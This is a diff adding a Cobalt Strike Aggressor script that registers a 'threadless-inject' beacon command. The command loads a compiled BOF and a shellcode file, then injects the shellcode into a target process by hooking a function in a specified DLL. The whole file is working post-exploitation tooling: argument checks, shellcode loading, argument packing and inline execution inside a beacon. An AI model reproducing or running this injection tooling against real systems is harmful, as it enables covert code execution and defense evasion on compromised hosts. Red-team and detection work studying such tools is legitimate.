@@ -1,0 +1,69 @@
+# Register command
+beacon_command_register(
+    "threadless-inject",
+    "Execute shellcode within a remote process via hooking function calls",
+    "Usage: threadless-inject <pid> <dll> <hook function> <shellcode path>"
+);
+
+alias threadless-inject {
+    # Check correct argument length
+    if (size(@_) != 5)
+    {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("threadless-inject"));
+        return;
+    }
+
+    local("$barch $handle $data $args $pid $dll $functionName $shellcodeFile")
+
+    # Check we are in x64 beacon
+    $barch = barch($1);
+    if ($barch !eq "x64") 
+    {
+        berror($1, "Only x64 beacons are supported currently");
+        return;
+    }
+
+    # Verify PID is an integer
+    # Conditional taken from: https://github.com/connormcgarr/cThreadHijack/blob/main/cThreadHijack.cna
+    if ((!-isnumber $2) || (int($2) <= 0))
+    {
+        berror($1, "Please enter a valid PID");
+        return;
+    }
+
+    # Read BOF file
+    $handle = openf(script_resource("threadless-inject.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Parse args
+    if (size(@_) == 5)
+    {
+        $pid = @_[1];
+        $dll = @_[2];
+        $functionName = @_[3];
+        $shellcodeFile = @_[4];
+    }
+
+    # Check shellcode file exists
+    if (!-exists $shellcodeFile)
+    {
+        berror($1, "Shellcode file doesn't exist");
+        return;
+    }
+
+    # Read shellcode from bin
+    # Snippet taken from: https://github.com/ScriptIdiot/sw2-secinject/blob/main/dist/sw2-secinject.cna
+    local("$sc_handle $sc_data");
+    $sc_handle = openf($shellcodeFile);
+    $sc_data = readb($sc_handle, -1);
+    closef($sc_handle);
+
+    # Pack args
+    $args = bof_pack($1, "izzb", $pid, $dll, $functionName, $sc_data);
+
+    # Execute BOF
+    btask($1, "Executing ThreadlessInjectBof by @0xLegacyy");
+    beacon_inline_execute($1, $data, "go", $args);
+}
